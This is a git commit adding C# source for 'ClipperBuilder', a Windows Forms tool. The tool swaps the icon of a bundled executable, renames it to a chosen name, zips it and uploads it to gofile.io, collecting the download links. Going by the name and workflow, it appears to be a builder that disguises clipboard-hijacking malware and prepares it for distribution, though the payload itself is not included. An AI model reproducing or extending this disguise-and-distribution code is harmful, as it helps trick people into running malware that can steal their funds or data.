bb6cc9c443c9be1252fe664e62cb5143b26b5ad7
User <User@HOME-PC>
2023-05-31 00:31:07 +0300

    Добавьте файлы проекта.

---
+++ ClipperBuilder/Form1.Designer.cs
@@ -0,0 +1,175 @@
+﻿namespace ClipperBuilder
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.button2 = new System.Windows.Forms.Button();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label1 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.groupBox2 = new System.Windows.Forms.GroupBox();
+            this.groupBox3 = new System.Windows.Forms.GroupBox();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.groupBox1.SuspendLayout();
+            this.groupBox2.SuspendLayout();
+            this.groupBox3.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.textBox2);
+            this.groupBox1.Controls.Add(this.textBox1);
+            this.groupBox1.Controls.Add(this.button2);
+            this.groupBox1.Controls.Add(this.label2);
+            this.groupBox1.Controls.Add(this.label1);
+            this.groupBox1.Location = new System.Drawing.Point(14, 13);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(399, 129);
+            this.groupBox1.TabIndex = 0;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "Options";
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(46, 54);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(333, 20);
+            this.textBox2.TabIndex = 6;
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(46, 20);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(333, 20);
+            this.textBox1.TabIndex = 5;
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(9, 91);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 23);
+            this.button2.TabIndex = 4;
+            this.button2.Text = "Select Icon";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(6, 57);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(41, 13);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "Name: ";
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(6, 23);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(34, 13);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "Icon: ";
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(36, 25);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(343, 26);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "Build&&Upload";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // groupBox2
+            // 
+            this.groupBox2.Controls.Add(this.button1);
+            this.groupBox2.Location = new System.Drawing.Point(14, 148);
+            this.groupBox2.Name = "groupBox2";
+            this.groupBox2.Size = new System.Drawing.Size(399, 68);
+            this.groupBox2.TabIndex = 1;
+            this.groupBox2.TabStop = false;
+            this.groupBox2.Text = "Main";
+            // 
+            // groupBox3
+            // 
+            this.groupBox3.Controls.Add(this.textBox3);
+            this.groupBox3.Location = new System.Drawing.Point(420, 13);
+            this.groupBox3.Name = "groupBox3";
+            this.groupBox3.Size = new System.Drawing.Size(248, 203);
+            this.groupBox3.TabIndex = 2;
+            this.groupBox3.TabStop = false;
+            this.groupBox3.Text = "Logs";
+            // 
+            // textBox3
+            // 
+            this.textBox3.Location = new System.Drawing.Point(7, 20);
+            this.textBox3.Multiline = true;
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(235, 177);
+            this.textBox3.TabIndex = 0;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(680, 228);
+            this.Controls.Add(this.groupBox3);
+            this.Controls.Add(this.groupBox2);
+            this.Controls.Add(this.groupBox1);
+            this.MaximumSize = new System.Drawing.Size(696, 267);
+            this.MinimumSize = new System.Drawing.Size(696, 267);
+            this.Name = "Form1";
+            this.Text = "ClipperBuilder";
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.groupBox2.ResumeLayout(false);
+            this.groupBox3.ResumeLayout(false);
+            this.groupBox3.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.GroupBox groupBox2;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.GroupBox groupBox3;
+        private System.Windows.Forms.TextBox textBox3;
+    }
+}
+
---
+++ ClipperBuilder/Form1.cs
@@ -0,0 +1,132 @@
+﻿using IconChanger;
+using Newtonsoft.Json.Linq;
+using System;
+using System.IO;
+using System.IO.Compression;
+using System.Net;
+using System.Text;
+using System.Windows.Forms;
+
+namespace ClipperBuilder
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog openFileDialog = new OpenFileDialog();
+            if (openFileDialog.ShowDialog() == DialogResult.OK)
+            {
+                string selectedFilePath = openFileDialog.FileName;
+                textBox1.Text = selectedFilePath;
+                textBox3.Text += "Chosen new ico path" + Environment.NewLine;
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            ChangeICO();
+            textBox3.Text += "Succesfully change ico" + Environment.NewLine;
+            System.Threading.Tasks.Task CopyTask = System.Threading.Tasks.Task.Factory.StartNew(() =>
+            {
+                Archive();
+            });
+            CopyTask.Wait();
+            upload();
+        }
+
+        private void ChangeICO()
+        {
+            var icon = new IconEditor();
+            icon.InjectIcon("Files\\Wzo0sX6pWg.exe", textBox1.Text, false);
+        }
+        private void upload()
+        {
+            string name = textBox2.Text;
+            using (WebClient client = new WebClient())
+            {
+
+                try
+                {
+                    mainupload("https://store5.gofile.io/uploadFile", name);
+                }
+                catch (Exception)
+                {
+                    try
+                    {
+                        mainupload("https://store4.gofile.io/uploadFile", name);
+                    }
+                    catch (Exception)
+                    {
+                        try
+                        {
+                            mainupload("https://store3.gofile.io/uploadFile", name);
+                        }
+                        catch (Exception)
+                        {
+                            try
+                            {
+                                mainupload("https://store2.gofile.io/uploadFile", name);
+                            }
+                            catch (Exception)
+                            {
+                                try
+                                {
+                                    mainupload("https://store1.gofile.io/uploadFile", name);
+                                }
+                                catch (Exception ex)
+                                {
+                                    textBox3.Text += ex.ToString() + Environment.NewLine;
+                                    textBox3.Text += $"Cant upload file on any gofile server" + Environment.NewLine;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        private void mainupload(string storelink, string name)
+        {
+            using (StreamWriter sw = new StreamWriter("result.txt"))
+            {
+                using (WebClient client = new WebClient())
+                {
+                    var upload = client.UploadFile(storelink, $"Result\\{name}.zip");
+                    var result = JObject.Parse(Encoding.UTF8.GetString(upload));
+                    var link = result["data"]["downloadPage"];
+                    textBox3.Text += link.ToString() + " " + name + Environment.NewLine;
+                    sw.WriteLine($"{link.ToString()} {name}");
+                }
+            }
+        }
+        private void Archive()
+        {
+            string name = textBox2.Text;
+            string[] files = Directory.GetFiles("Files");
+            
+            var fileStream = new FileStream(Path.GetFullPath($"Result\\{name}.zip"), FileMode.Create);
+            var archive = new ZipArchive(fileStream, ZipArchiveMode.Create);
+            foreach (string file in files)
+            {
+                string z = file.Remove(0, 6);
+                if (file.Contains(".exe") == true)
+                {
+                    string ifexe = name + ".exe";
+                    archive.CreateEntryFromFile($"Files\\{z}", ifexe);
+                }
+                else
+                {
+                    archive.CreateEntryFromFile($"Files\\{z}", z);
+                }
+            }
+            archive.Dispose();
+            textBox3.Text += $"Created {name}.zip" + Environment.NewLine;
+
+        }
+    }
+}
